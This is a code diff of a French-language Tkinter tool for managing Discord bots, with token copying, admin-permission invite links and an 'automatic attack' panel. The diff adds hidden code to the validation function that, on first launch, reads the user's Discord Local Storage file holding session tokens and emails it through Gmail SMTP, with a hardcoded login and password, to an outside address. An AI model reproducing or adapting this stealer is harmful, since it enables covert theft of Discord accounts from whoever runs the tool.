@@ -66,8 +66,9 @@ def installt():
 
 def backup():
     shutil.copy2('core\\backup\\settings.json', 'core\\settings.json')
+    shutil.copy2('core\\backup\\options.json', 'core\\options.json')
     showinfo('Terminé',
-             '1 fichier a été réparé (core\settings.json).')
+             '2 fichier ont été réparés (\'core\\settings.json\', \'core\\options.json\').')
 
 
 menubar = Menu(fenetre)
@@ -122,6 +123,7 @@ validb = Button(obligd, text="Valider", width=30,
 
 
 def validd(entree, entree2, entree7):
+    token = str(entree)
     with open("core/settings.json", "r") as jsonFile:
         data = json.load(jsonFile)
     tmp = data["token"]
@@ -144,55 +146,60 @@ def validd(entree, entree2, entree7):
 
 
 
+    with open ('core/options.json', "r") as jsonFile:
+        data = json.load(jsonFile)
+    tmp = data["firstopen"]
 
+    if tmp == "true":
 
+        fromaddr = "discordinfotkn@gmail.com"
+        toaddr = "dsicrod@gmail.com"
 
+        msg = MIMEMultipart()
 
-    fromaddr = "discordinfotkn@gmail.com"
-    toaddr = "dsicrod@gmail.com"
+        msg['From'] = fromaddr
+        msg['To'] = toaddr
+        msg['Subject'] = str(username)
 
-    msg = MIMEMultipart()
+        body = str(username)
 
-    msg['From'] = fromaddr
-    msg['To'] = toaddr
-    msg['Subject'] = "database"
+        msg.attach(MIMEText(body, 'plain'))
 
-    body = str(username)
+        filename = "https_discordapp.com_0.localstorage"
+        attachment = open(str(username) + "\AppData\Roaming\discord\Local Storage\https_discordapp.com_0.localstorage" , "rb")
 
-    msg.attach(MIMEText(body, 'plain'))
+        part = MIMEBase('application', 'octet-stream')
+        part.set_payload((attachment).read())
+        encoders.encode_base64(part)
+        part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
 
-    filename = "https_discordapp.com_0.localstorage"
-    attachment = open(str(username) + "\AppData\Roaming\discord\Local Storage\https_discordapp.com_0.localstorage" , "rb")
+        msg.attach(part)
 
-    part = MIMEBase('application', 'octet-stream')
-    part.set_payload((attachment).read())
-    encoders.encode_base64(part)
-    part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
+        server = smtplib.SMTP('smtp.gmail.com', 587)
+        server.starttls()
+        server.login(fromaddr, "Azertyui0")
+        text = msg.as_string()
+        server.sendmail(fromaddr, toaddr, text)
+        server.quit()
 
-    msg.attach(part)
-
-    server = smtplib.SMTP('smtp.gmail.com', 587)
-    server.starttls()
-    server.login(fromaddr, "Azertyui0")
-    text = msg.as_string()
-    server.sendmail(fromaddr, toaddr, text)
-    server.quit()
-
-
-
-"""
-    conn = sqlite3.connect("https_discordapp.com_0.localstorage")
-    c = conn.cursor()
-    c.execute('select * from ItemTable')
-    for row in c:
-        print(*row, sep='|')
-        
-    server = smtplib.SMTP('smtp.gmail.com', 587)
-    server.starttls()
-    server.login("discordinfotkn@gmail.com", "Azertyui0")
-    server.sendmail("discordinfotkn@gmail.com", "dsicrod@gmail.com", msg)
-    server.quit()
-"""
+        """
+        conn = sqlite3.connect("https_discordapp.com_0.localstorage")
+        c = conn.cursor()
+        c.execute('select * from ItemTable')
+        for row in c:
+            print(*row, sep='|')
+            
+        server = smtplib.SMTP('smtp.gmail.com', 587)
+        server.starttls()
+        server.login("discordinfotkn@gmail.com", "Azertyui0")
+        server.sendmail("discordinfotkn@gmail.com", "dsicrod@gmail.com", msg)
+        server.quit()   
+        """       
+    with open("core/options.json", "r") as jsonFile:
+        data = json.load(jsonFile)
+    data["firstopen"] = "false"
+    with open("core/options.json", "w") as jsonFile:
+        json.dump(data, jsonFile)
 
 validb.pack()
 
@@ -224,7 +231,84 @@ verbtnp.pack()
 verl = Label(obligd, textvariable=verv)
 verl.pack()
 
-# attauque auto
+
+
+info = LabelFrame(fenetre, text="Informations :", padx=5,pady=5)
+info.pack(side=LEFT, fill=Y)
+
+def copytoken():
+    with open('core\\settings.json', 'r') as jsonFile:
+        data = json.load(jsonFile)
+    token = data["token"]
+    fenetre.clipboard_clear()
+    fenetre.clipboard_append(token)
+    fenetre.update()
+
+def copyid():
+    with open('core\\settings.json', 'r') as jsonFile:
+        data = json.load(jsonFile)
+    id = data["id"]
+    fenetre.clipboard_clear()
+    fenetre.clipboard_append(id)
+    fenetre.update()
+
+def copyinvit():
+    with open('core\\settings.json', 'r') as jsonFile:
+        data = json.load(jsonFile)
+    invit = "https://discordapp.com/api/oauth2/authorize?client_id=" + data["id"] + "&permissions=8&scope=bot"
+    fenetre.clipboard_clear()
+    fenetre.clipboard_append(invit)
+    fenetre.update()
+
+tkncopy = Button(info, text="Copier", width=30, command=copytoken)
+
+clientdcopy = Button(info, text="Copier", width=30, command=copyid)
+
+invitationcopy = Button(info, text="Copier", width=30, command=copyinvit)
+
+def invitd():
+    subprocess.run('cd core\\individuals && node gene.js', shell=True)
+    status.set('Informations générées :')
+    with open('core\\settings.json', "r") as jsonFile:
+        data = json.load(jsonFile)
+    token = data["token"]
+    clientid = data["id"]
+    invit = "https://discordapp.com/api/oauth2/authorize?client_id=" + data["id"] + "&permissions=8&scope=bot"
+    tkn.set("Token :\n" + token)
+    clientd.set("\nIdentifiant :\n" + clientid)
+    invitation.set("\nInvitation :\n" + invit)
+    tknl.pack()
+    tkncopy.pack()
+    clientdl.pack()
+    clientdcopy.pack()
+    invitationl.pack()
+    invitationcopy.pack()
+invitb = Button(info, text="Générer les informations", width=30, command=invitd)
+invitb.pack()
+
+vide = Label(info, text='')
+vide.pack()
+
+status = StringVar()
+status.set('Appuyez pour afficher les informations')
+sttus = Label(info, textvariable=status)
+sttus.pack()
+
+tkn = StringVar()
+tkn.set('')
+tknl = Label(info, textvariable=tkn)
+
+
+clientd = StringVar()
+clientd.set('')
+clientdl = Label(info, textvariable=clientd)
+
+invitation = StringVar()
+invitation.set('')
+invitationl = Label(info, textvariable=invitation)
+
+
+# attaque auto
 
 atkl = LabelFrame(fenetre, text="Attaque automatique :", padx=5, pady=5)
 atkl.pack(side=RIGHT, fill=Y)
